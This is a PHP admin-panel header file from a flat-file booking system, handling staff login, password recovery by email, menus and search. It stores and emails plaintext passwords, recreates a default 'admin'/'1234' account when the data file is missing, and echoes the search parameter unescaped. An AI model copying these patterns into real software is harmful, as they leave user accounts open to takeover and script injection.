				$(".youtube").colorbox({iframe:true, innerWidth:640, innerHeight:390});
				$(".vimeo").colorbox({iframe:true, innerWidth:500, innerHeight:409});
				$(".iframe").colorbox({iframe:true, transition:"elastic", width:"874", height:"80%", opacity:"100"});
				$(".iframe_order").colorbox({iframe:true, transition:"elastic", width:"80%", height:"90%", opacity:"100"});
				$(".inline").colorbox({inline:true, width:"50%"});
				$(".callbacks").colorbox({
					onOpen:function(){ alert('onOpen: colorbox is about to open'); },
					onLoad:function(){ alert('onLoad: colorbox has started to load the targeted content'); },
					onComplete:function(){ alert('onComplete: colorbox has displayed the loaded content'); },
					onCleanup:function(){ alert('onCleanup: colorbox has begun the close process'); },
					onClosed:function(){ alert('onClosed: colorbox has completely closed'); }
				});

				$('.non-retina').colorbox({rel:'group5', transition:'none'})
				$('.retina').colorbox({rel:'group5', transition:'none', retinaImage:true, retinaUrl:true});
				
				//Example of preserving a JavaScript event for inline calls.
				$("#click").click(function(){ 
					$('#click').css({"background-color":"#f00", "color":"#fff", "cursor":"inherit"}).text("Open this window again and this message will still be here.");
					return false;
				});
			});
</script>

<script>
// "getElementsByClassName" for IE, 
//  
if(document.getElementsByClassName == undefined) { 
   document.getElementsByClassName = function(cl) { 
      var retnode = []; 
      var myclass = new RegExp('\\b'+cl+'\\b'); 
      var elem = this.getElementsByTagName('*'); 
      for (var i = 0; i < elem.length; i++) { 
         var classes = elem[i].className; 
         if (myclass.test(classes)) { 
            retnode.push(elem[i]); 
         } 
      } 
      return retnode; 
   } 
}; 
</script>

<script src="../js/light_txt_query.js"></script>
<!--<script src="../js/scroll.js"></script>-->

<script>
$(document).ready(function(){ // Scroll
	$(".scrollto").on("click", function (event) {
		
		event.preventDefault();
		var id  = $(this).attr('href'),
	    top = $(id).position().top-14; 
		$('#win_edit').animate({scrollTop: top}, 400);
		
		if (id == '#units') {setTimeout(function() {$('#units').toggleClass('this_scroll_block');}, 400);} 
		else {$('#units').removeClass('this_scroll_block');}
		
		if (id == '#queue') {setTimeout(function() {$('#queue').toggleClass('this_scroll_block');}, 400);} 
		else {$('#queue').removeClass('this_scroll_block');}
		
		if (id == '#daily_provide') {setTimeout(function() {$('#daily_provide').toggleClass('this_scroll_block');}, 400);} 
		else {$('#daily_provide').removeClass('this_scroll_block');}
		
		if (id == '#navworkdays') {setTimeout(function() {$('#navworkdays').toggleClass('this_scroll_block');}, 400);} 
		else {$('#navworkdays').removeClass('this_scroll_block');}
		
		if (id == '#navdwd') {setTimeout(function() {$('#navdwd').toggleClass('this_scroll_block');}, 400);} 
		else {$('#navdwd').removeClass('this_scroll_block');}
		
		if (id == '#navfixprice') {setTimeout(function() {$('#navfixprice').toggleClass('this_scroll_block');}, 400);} 
		else {$('#navfixprice').removeClass('this_scroll_block');}
		
		if (id == '#promo_code') {setTimeout(function() {$('#promo_code').toggleClass('this_scroll_block');}, 400);} 
		else {$('#promo_code').removeClass('this_scroll_block');}
		
		if (id == '#navphotos') {setTimeout(function() {$('#navphotos').toggleClass('this_scroll_block');}, 400);} 
		else {$('#navphotos').removeClass('this_scroll_block');}
		
		if (id == '#currency') {setTimeout(function() {$('#currency').toggleClass('this_scroll_block');}, 400);} 
		else {$('#currency').removeClass('this_scroll_block');}
		
		if (id == '#all_time_spots') {setTimeout(function() {$('#all_time_spots').toggleClass('this_scroll_block');}, 400);} 
		else {$('#all_time_spots').removeClass('this_scroll_block');}
		
		if (id == '#always_free') {setTimeout(function() {$('#always_free').toggleClass('this_scroll_block');}, 400);} 
		else {$('#always_free').removeClass('this_scroll_block');}
		
		if (id == '#only_pay') {setTimeout(function() {$('#only_pay').toggleClass('this_scroll_block');}, 400);} 
		else {$('#only_pay').removeClass('this_scroll_block');}
		
		if (id == '#only_row') {setTimeout(function() {$('#only_row').toggleClass('this_scroll_block');}, 400);} 
		else {$('#only_row').removeClass('this_scroll_block');}
		
		if (id == '#active_two_monts') {setTimeout(function() {$('#active_two_monts').toggleClass('this_scroll_block');}, 400);} 
		else {$('#active_two_monts').removeClass('this_scroll_block');}
		
	return false;
		
		//$(id).removeClass('this_scroll_block');
});

});
</script>


<script>

$(document).ready(function(){
    $("a, div, input, button, span, small, label").each(function(b) {
        if (this.title) {
            var c = this.title;
            var x = -16;
            var y = 32;
            $(this).mouseover(function(d) {
				
                this.title = "";
                $("#main").append('<div id="tooltip">' + c + "</div>");
				
                $("#tooltip").css({
					
                    left: (d.pageX + x) + "px",
                    top: (d.pageY + y) + "px",
                    opacity: "0.8",
					visibility: "visible",
					//display: "block"
				
                }).delay(200).fadeIn(400)
					
            }).mouseout(function() {
                this.title = c;
                $("#tooltip").remove()
            }).mousemove(function(d) {
                $("#tooltip").css({
                    left: (d.pageX + x) + "px",
                    top: (d.pageY + y) + "px"
                })
            })
        }
    })
    });	
</script>



<?php if($id_prefix != 'order' && $id_prefix != 'logbook') { include('../js/custom_date.php'); } ?>

<?php if(empty($_POST)) { ?>
<style>div.body_apanel {opacity: 0; visibility:hidden;}</style>
<noscript><style>div.body_apanel {opacity: 1!important; visibility:visible!important;}</style></noscript>

<?php } ?>


<?php if($id_prefix == 'settings') { ?>
<link rel="stylesheet" href="../js/CodeMirror/lib/codemirror.css">

<script src="../js/CodeMirror/lib/codemirror.js"></script>
<script src="../js/CodeMirror/mode/xml/xml.js"></script>
<script src="../js/CodeMirror/mode/javascript/javascript.js"></script>
<script src="../js/CodeMirror/mode/css/css.js"></script>
<script src="../js/CodeMirror/mode/htmlmixed/htmlmixed.js"></script>
<script src="../js/CodeMirror/addon/edit/matchbrackets.js"></script>
<?php } ?>
</head>


<?php


if (isset($_GET['iframe'])==true) { echo '<body class="apanel_iframe"><div class="body_apanel">'; } else {echo '<body class="apanel"><div class="body_apanel">';}

echo '<script> setTimeout(function() { document.getElementsByTagName("div")[0].setAttribute("style","opacity:1;visibility:visible;"); }, 160);    </script>';

//==============================/HTML

$file_name_staff = '../data/staff.dat';

$mail_found = 'no';

$id_this_user = '';

if (file_exists($file_name_staff)) {
	
$file_staff = fopen($file_name_staff, "rb"); 

if (filesize($file_name_staff) != 0) { // !0
	
flock($file_staff, LOCK_SH); 
$lines_staff = preg_split("~\r*?\n+\r*?~", fread($file_staff,filesize($file_name_staff)));
flock($file_staff, LOCK_UN); 
fclose($file_staff); 


for ($ls = 0; $ls < sizeof($lines_staff); ++$ls) { 

if (!empty($lines_staff[$ls])) {

$data_access = explode('::', $lines_staff[$ls]); 
array_pop($data_access);



if (isset($_SESSION['aloginsys']) && isset($_SESSION['apasswsys'])) {


if (!empty($data_access[1]) && $_SESSION['aloginsys'] == $data_access[1] && $_SESSION['apasswsys'] == $data_access[2]) {
	
$number_line = $ls;

$number_line_access = $ls;

$id_staff_info = $data_access[0];
$login_staff_info = $data_access[1];
$sapas_staff_info = $data_access[2];
$passw_staff_info = $data_access[3];
$access_staff_info = $data_access[4];


$name_staff_info = $data_access[5];
$email_staff_info = $data_access[6];
$email_display_staff_info = $data_access[7];
$phone_staff_info = $data_access[8];
$phone_display_staff_info = $data_access[9];
$post_staff_info = $data_access[10];
$description_staff_info = $data_access[11];
$photo_staff_info = $data_access[12];
$photo_display_staff_info = $data_access[13];
$active_staff_info = $data_access[14];


$add_who = $id_staff_info;


if ($ls == 0) {$access_level ='super_admin';} // super admin
else if ($ls != 0 && $access_staff_info == 'admin') {$access_level = 'admin';}
else if ($access_staff_info == 'staff') {$access_level = 'staff';}

if ($login_staff_info == $_SESSION['aloginsys']) {$id_this_user = $id_staff_info;}

} // login & pass true  
} // session 

//====================================SENT LOGIN & PASSWORD
if (isset($_GET['lost_pass']) == true) {
	
if (isset($_POST['email']) == true) {	

$data_access[6] = mb_strtolower($data_access[6], 'utf8');	
$user_mail = mb_strtolower($_POST['email'], 'utf8');
$user_mail = htmlspecialchars($user_mail,ENT_QUOTES);
$lang['lost_pass_mail'] = mb_strtolower($lang['lost_pass_mail'], 'utf8');	

if (empty($user_mail) || $user_mail == $lang['lost_pass_mail']) {$empty_enter_mail = '';} 
else if(!preg_match('/.+@.+\..+/i', $user_mail)) { $error_enter_mail = '';} else {
	
if ($user_mail == $data_access[6]) {
$mail_found = 'found';
$sent_pass = $data_access[3];
$sent_login = $data_access[1];
$sent_mail = $data_access[6];	



//------------html message	

	
  $dt = date("d.m.Y, H:i:s"); // time
  $mail = $sent_mail; // e-mail to:
  $title = $lang['title_lost_pass_mess']." ".$product." (".$org_name.")"; // title
  
  $mess = "<html><body>";
 
  $mess.="<table style=\"border:0; border-collapse:collapse; margin: 10px 0 10px 0; width:100%;\">";
  $mess.="<tr><td colspan=\"2\" style=\"border: #fff 1px solid; background:".$color1."; padding:14px; vertical-align:top;\">
  <h3 style=\"COLOR: #fff; margin: 0; padding:0;\">".$lang['title_lost_pass_mess']." ".$product." (".$org_name.")</h3></td></tr>";
  
  $mess.="<tr><td style=\"border: #fff 1px solid; background:#f3f3f3; padding:14px; color:#757577; width:100px; vertical-align:top;\">".$lang['login'].":</td> <td style=\"border: #fff 1px solid; background:#f3f3f3; padding:14px; vertical-align:top;\">".$sent_login."</td></tr>";
  $mess.="<tr><td style=\"border: #fff 1px solid; background:#f3f3f3; padding:14px; color:#757577; vertical-align:top;\">".$lang['pass'].":</td> <td style=\"border: #fff 1px solid; background:#f3f3f3; padding:14px; vertical-align:top;\">".$sent_pass."</td></tr>";
 
  
  $mess.="
  <tr><td style=\"border: #fff 1px solid; background:#e3f3ff; padding:14px; color:#000; vertical-align:top;\" colspan=\"2\">
  <a href=\"http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."\">".$lang['admin_title']." - ".$product."</a>
  </td></tr>
  
  <tr><td style=\"border: #fff 1px solid; background:#f3f3f3; padding:14px; color:#888; vertical-align:top;\" colspan=\"2\">
  <small>".$lang['when_sent'].": ".$dt." | IP: ".$_SERVER['REMOTE_ADDR']."</small></td></tr>
    
  </table><body></html>";
  
  $headers = "MIME-Version: 1.0\r\n";
  $headers .= "Content-Transfer-Encoding: 8bit\r\n";
  $headers .= "Content-type:text/html;charset=utf-8 \r\n"; 
  $headers .= "From: ".$org_name." <noreply@".$_SERVER['HTTP_HOST'].">\r\n"; // from
  //$headers .= "Bcc: ".$mail."\r\n"; // copy
  $headers.= "X-Mailer: PHPMailer ".phpversion()."\r\n";
  mail($mail, $title, $mess, $headers); // SENT	
	
//------------/html message	
	
echo '<div class="shadow_back"><div class="done modal_mess"><ul><li>'.$lang['lost_pass_sent'].'</li></ul></div></div>'; echo $refresh_3; 
} else {$mail_not_found = '';}


} // check valid mail	
} // post mail
} //get lost pass
//-----------/sent login & pass


} //no empty lines
} // count lines
} //-------------/NO EMPTY DATA
} else { //==============================================//Create access data file !!! (RESET)

$add_login = 'admin';
$add_passsa = '7110eda4d09e062aa5e4a390b0a572ac0d2c0220';
$add_pass = '1234';
$add_access = 'admin';
$add_name = $lang['admin'];
$add_mail = 'admin@'.$host_name;
$add_display_mail = 'no';
$add_phone = '';
$add_display_phone = 'no';
$add_post = '';
$add_description = '';
$add_photo = '';
$add_display_photo = 'yes';
$add_active = 'on';

$line_data_add = $id.'::'.$add_login.'::'.$add_passsa.'::'.$add_pass.'::'.$add_access.'::'.$add_name.'::'.$add_mail.'::'.$add_display_mail.'::'.$add_phone.'::'.$add_display_phone.'::'.$add_post.'::'.$add_description.'::'.$add_photo.'::'.$add_display_photo.'::'.$add_active.'::'.$id.'::'.$new_add_time.'::'.$id.'::';

$fp_create = fopen($file_name_staff, "w"); // create data file
fwrite($fp_create, "$line_data_add");
fclose ($fp_create);

//echo '<div class="error">'.$lang['no_file'].'</div>';
echo $refresh_1;

} //-------------/create (RESET)


if (isset($_SESSION['aloginsys']) && isset($_SESSION['apasswsys'])) {

if (!isset($id_staff_info)) { echo $error_access.$refresh_3; session_destroy(); } else {

//============================================================================ ACCESS

$access = 'yes';


$admin_menu = '';

$admin_menu .= '
<li><a href="staff.php" '; if($id_prefix == 'staff'){$admin_menu .= 'class="current"';}$admin_menu .= '><i class="icon-group"></i><span>'.$lang['staff'].'</span></a></li>

<li><a href="photos.php" ';if($id_prefix == 'photos'){$admin_menu .= 'class="current"';}$admin_menu .='><i class="icon-camera-3"></i><span>'.$lang['photos'].'</span></a></li>

<li><a href="category.php" ';if($id_prefix == 'category'){$admin_menu .= 'class="current"';}$admin_menu .='><i class="icon-archive"></i><span>'.$lang['categorys'].'</span></a></li>

<li><a href="object.php" ';if($id_prefix == 'object'){$admin_menu .= 'class="current"';}$admin_menu .='><i class="icon-briefcase-1"></i><span>'.$lang['services'].'</span></a></li>';


if ($access_staff_info == 'admin') {
$admin_menu .= '<li><a href="order.php" ';if($id_prefix == 'order'){$admin_menu .= 'class="current"';}$admin_menu .='><i class="icon-bell-1"></i><span>'.$lang['orders'].'</span></a></li>';	
} else {
$admin_menu .= '<li><a href="order.php?search='.$id_this_user.'" ';if($id_prefix == 'order'){$admin_menu .= 'class="current"';}$admin_menu .='><i class="icon-bell-1"></i><span>'.$lang['orders'].'</span></a></li>';
}


$admin_menu .= '<li><a href="schedule.php" ';if($id_prefix == 'schedule'){$admin_menu .= 'class="current"';}$admin_menu .='><i class="icon-pin"></i><span>'.$lang['schedule'].'</span></a></li>

<li><a href="logbook.php" ';if($id_prefix == 'logbook'){$admin_menu .= 'class="current"';}$admin_menu .='><i class="icon-book-1"></i><span>'.$lang['logbook'].'</span></a></li>

<li><a href="settings.php" ';if($id_prefix == 'settings'){$admin_menu .= 'class="current"';}$admin_menu .='><i class="icon-cog-1"></i><span>'.$lang['settings'].'</span></a></li>';

//===================================TOP MENU

if (isset($_GET['iframe'])==true) { echo ''; } else {
echo'<div id="admin_menu">
<ul>

<li><a href="index.php" ';if($id_prefix == 'index'){echo'class="current"';}echo'><i class="icon-menu"></i><span>'.$lang['menu'].'</span></a></li>
'.$admin_menu.'
</ul>
<div class="clear"></div>
</div>';

echo '<div id="top_info">';

echo '<div class="admin_title_page"><h4 id="go_title">';

if($id_prefix == 'index'){echo $lang['home'];}
if($id_prefix == 'staff'){echo $lang['staff'];}
if($id_prefix == 'category'){echo $lang['categorys'];}
if($id_prefix == 'object'){echo $lang['services'];}
if($id_prefix == 'order'){echo $lang['orders'];}
if($id_prefix == 'settings'){echo $lang['settings'];}
if($id_prefix == 'photos'){echo $lang['photos'];}
if($id_prefix == 'schedule'){echo $lang['schedule'];}
if($id_prefix == 'logbook'){echo $lang['logbook'];}
echo'</h4></div>';

$all_cl = ''; $atc_cl = ''; $us_cl = ''; 

$actual_check = '';
if(isset($_POST['actual_orders']) || isset($_GET['actual_orders'])) {$actual_check = 'checked="checked"';}

$title_check = '';
if (isset($_GET['actual_orders'])) {$title_check = $lang['order_more_deck'];} else { $title_check = $lang['order_actual']; }

$actual_checkbox_all = '<span class="actual_check">
<label id="title_ac" title="'.$title_check.'"><input type="checkbox" id="vactual" value="1" '.$actual_check.' /><span></span></label>
</span>';	

$actual_checkbox_my = '<span class="actual_check">
<label id="title_ac" title="'.$title_check.'"><input type="checkbox" id="vactual" value="1" '.$actual_check.' /><span></span></label>
</span>';	

if(isset($_GET['search'])) {$inp_search = $_GET['search'];}

if(isset($_GET['actual'])){$all_cl = 'no_this'; $atc_cl = 'this_al';} 

if(!isset($_GET['search'])) {$all_cl = 'this_al'; $atc_cl = 'no_this';} else {$all_cl = 'no_this'; $actual_checkbox_all = '';}

if(isset($_GET['search']) && $_GET['search'] == $id_this_user) {$us_cl = 'this_al'; $inp_search = '';} else {$us_cl = 'no_this'; $actual_checkbox_my = '';}
	
if($id_prefix == 'order')
{
	

	
echo '<div class="select_orders">';	

echo '<span class="ord_list_link">
<a href="?search='.$id_this_user.'" class="'.$us_cl.'">'.$lang['my_orders'].'</a>';
echo $actual_checkbox_my;
echo '</span>';
	

echo '<span class="ord_list_link">
<a href="'.$id_prefix.'.php" class="'.$all_cl.'">'.$lang['all_orders'].'</a>';
echo $actual_checkbox_all;
echo '</span>';


echo '<div class="help_obj comment_client" tabindex="1"><i class="icon-help-1"></i><div>'.$lang['help_orders'].'</div></div>';

echo '</div>';	

//echo '<div class="select_orders_b"></div>';	

}

if($id_prefix == 'logbook')
{
echo '<div class="select_orders">';	

echo '<span class="ord_list_link">
<a href="?search='.$id_this_user.'" class="'.$us_cl.'">'.$lang['my_orders'].'</a>';
if (isset($_GET['search']) && $_GET['search'] == $id_this_user) { echo '<span class="reset_my"><a href="'.$script_name.'" title="'.$lang['reset'].'"><i class="icon-block"></i></a></span>'; }

echo '</span>';

echo '</div>';	
}





echo '
<div class="top_info_block parent" tabindex="1"><i class="icon-user"></i>'.$name_staff_info.'
<div class="info">';

if (!empty($photo_staff_info)) {
	
if(file_exists('../'.$photo_staff_info)){
echo'<img src="../'.$photo_staff_info.'" alt="'.$name_staff_info.'" title="'.$lang['profile'].'" />';}
else{echo'<img src="../img/no_photo.jpg" alt="'.$name_staff_info.'" title="'.$lang['profile'].'" />';}

} else {echo'<div class="name_photo"><img src="../img/no_photo.jpg" alt="'.$name_staff_info.'" title="'.$lang['profile'].'" /></div>';}

echo '<div class="profile_info">';
echo '<span title="'.$lang['access_level'].'">'; 
if ($access_level == 'super_admin') {echo '<i class="icon-lock-open"></i>'.$lang['super_admin'];} else {
if($access_staff_info == 'admin') {echo '<i class="icon-lock-open-alt"></i>'.$lang['admin'];}
if($access_staff_info == 'staff') {echo '<i class="icon-lock"></i>'.$lang['staff'];} }
echo '</span></div>';

echo '
<span><a href="staff.php?edit='.$number_line.'" class=""><i class="icon-edit"></i>'.$lang['edit'].'</a></span>
<span><a href="?logout" class="logout"><i class="icon-logout"></i>'.$lang['logout'].'</a></span>';

echo '
</div>
</div>';



echo '<div class="top_info_block">
<span>'.$lang['date'].':</span> '.date('d.m.Y').' <span>'.$lang['time'].': </span>'; include('../inc/move_time.php'); echo'
</div>';


if($id_prefix == 'index' || $id_prefix == 'photos' || $id_prefix == 'settings' || $id_prefix == 'schedule') {echo'';} else {
	
$action_search = $script_name;






echo '<div class="search_block">
<form name="get_search" method="get" action="'.$action_search.'">';

if($id_prefix == 'order' || $id_prefix == 'logbook') {
echo '
<input type="text" name="search" id="search_inp" value="'.$inp_search.'" onfocus="this.select();lcs(this)" onclick="event.cancelBubble=true;this.select();lcs(this)" />';
include('../js/search_date.php');
} else {
echo '
<input type="text" name="search" id="search_inp" value="'.$inp_search.'" />';
}



echo '<button title="'.$lang['search'].'"><i class="icon-search"></i></button>
</form>
<div class="clear"></div>
</div>'; }


if($id_prefix == 'object') { // select cftegory

echo '<div class="select_cat"><select id="cat_sear" onchange="cat_filter()">';
echo '<option value="">'.$lang['all_categorys'].'</option>';
//============================== CATEGORY NAME SEARCH
$file_name_category_sear = '../data/category.dat';
if (file_exists($file_name_category_sear)) {	
$file_category_sear = fopen($file_name_category_sear, "rb"); 
if (filesize($file_name_category_sear) != 0) { // !0
flock($file_category_sear, LOCK_SH); 
$lines_category_sear = preg_split("~\r*?\n+\r*?~", fread($file_category_sear,filesize($file_name_category_sear)));
flock($file_category_sear, LOCK_UN); 
fclose($file_category_sear); 
for ($lcs = 0; $lcs < sizeof($lines_category_sear); ++$lcs) { 
if (!empty($lines_category_sear[$lcs])) {
$data_categories_search = explode('::', $lines_category_sear[$lcs]); 
$id_cat_opt = $data_categories_search[0];
$name_cat_opt =  $data_categories_search[1];


echo '<option value="'.$name_cat_opt.'">'.$name_cat_opt.'</option>';

echo '';

} //no empty lines cat
} //count cat
} //else { echo '<span class="red_text">'.$lang['category_empty'].' </span>';} //filesize cat
} //file_exists cat
//============================== /CATEGORY NAME SEARCH

echo '</select>';
echo '<div class="clear"></div>';
echo '</div>';


echo '
<script>
function cat_filter() {
var selc = document.getElementById("cat_sear");
var valc = selc.options[selc.selectedIndex].value;

document.location.href="'.$script_name.'?search="+valc;	
}
</script>
';

} // select cftegory


if (isset($_GET['search'])) {
echo '<a href="'.$script_name.'" class="reset_search" title="'.$lang['reset_search'].'"><i class="icon-block-1"></i></a>';
}


//=======================================SELECT MONTH IN HISTORY
$arr_sel_per = array();
//$m_per = date('m');
//$y_per = date('Y');
$m_per = '';
$y_per = '';
$per = '0';
if($id_prefix == 'logbook') {
	
if (isset($_GET['search']) && isset($_GET['period'])) {
$arr_sel_per = explode('.', $_GET['search']);	
if (isset($arr_sel_per[0])) {$m_per = $arr_sel_per[0];}
if (isset($arr_sel_per[1])) {$y_per = $arr_sel_per[1];} 
}	
	
echo '<div class="select_per">';

echo '<select id="m_sear" onchange="month_filter()">';
for ($sm = 1; $sm < 13; ++$sm) {	
if (strlen($sm) == 1) {$sm = '0'.$sm;}
if ($m_per == $sm) {$per = '1'; $sm_selected = ' selected="selected"';} else {$sm_selected = '';}
echo '<option value="'.$sm.'" '.$sm_selected.'>'.$lang_monts[$sm].'</option>';
}
if ($per == '0') {echo '<option value="" selected="selected">'.$lang['month'].'</option>';}
echo '</select>';



echo '<select id="y_sear" onchange="month_filter()">';
for ($sy = 2015; $sy < date('Y')+3; ++$sy) {	
if ($y_per == $sy) {$sy_selected = ' selected="selected"';} else {$sy_selected = '';}
echo '<option value="'.$sy.'" '.$sy_selected.'>'.$sy.'</option>';
}
if ($per == '0') {echo '<option value="" selected="selected">'.$lang['year'].'</option>';}
echo '</select>';

echo '<a href="'.$script_name.'?search='.$m_per.'.'.$y_per.'" id="subm_per" class="submit" title="'.$lang['view_orders_select_month'].'"><i class="icon-calendar-empty"></i></a>';

echo '<div class="clear"></div>';
echo '</div>';

echo '
<script>

var mselc = document.getElementById("m_sear");
var yselc = document.getElementById("y_sear");
var sselc = document.getElementById("subm_per");

function month_filter() {

var mvalc = mselc.options[mselc.selectedIndex].value;
var yvalc = yselc.options[yselc.selectedIndex].value;

//document.location.href="'.$script_name.'?search="+mvalc+"."+yvalc;	

sselc.removeAttribute("href");

sselc.setAttribute("href", "'.$script_name.'?search="+mvalc+"."+yvalc+"&period");
}
</script>
';


} // id logbook
//-------------------------------------/select month




echo '<div class="clear"></div>

</div>';

if(version_compare(PHP_VERSION, '5.3.0') >= 0) {echo'';} else {
echo'<div class="warring" style="width:1045px; display:block; margin: 14px auto 0 auto;">'.$lang['php_ver_error1'].' ('.phpversion().'). '.$lang['php_ver_error2'].'</div>';
}


} 
//=======================================/TOP MENU


}


} else { echo $login_form; }

if (isset($empty_enter_mail)){echo '<div class="shadow_back"><div class="error modal_mess">'.$lang['error_mail_empty'].'</div></div>'; 
echo '<script>var delay = 3000;setTimeout("document.location.href=\''.$script_name.'?lost_pass\'", delay);</script>
<noscript><meta http-equiv="refresh" content="3; url='.$script_name.'?lost_pass"></noscript>'; 
}

if (isset($error_enter_mail)){echo '<div class="shadow_back"><div class="error modal_mess"><ul><li>'.$lang['error_mail_invalid'].' ('.$user_mail.')</li></ul></div></div>'; 
echo '<script>var delay = 3000;setTimeout("document.location.href=\''.$script_name.'?lost_pass\'", delay);</script>
<noscript><meta http-equiv="refresh" content="3; url='.$script_name.'?lost_pass"></noscript>'; 
}

if (isset($mail_not_found) && $mail_found == 'no'){echo '<div class="shadow_back"><div class="error modal_mess"><ul><li>'.$lang['mail_not_found'].' ('.$user_mail.')</li></ul></div></div>'; echo $refresh_3; }


$file_temp = '../inc/custom_color.php';
if (file_exists($file_temp)) { 
include_once($file_temp);
} 	 


if (isset($_GET['logout'])) {session_destroy(); echo $refresh_0;}

?>



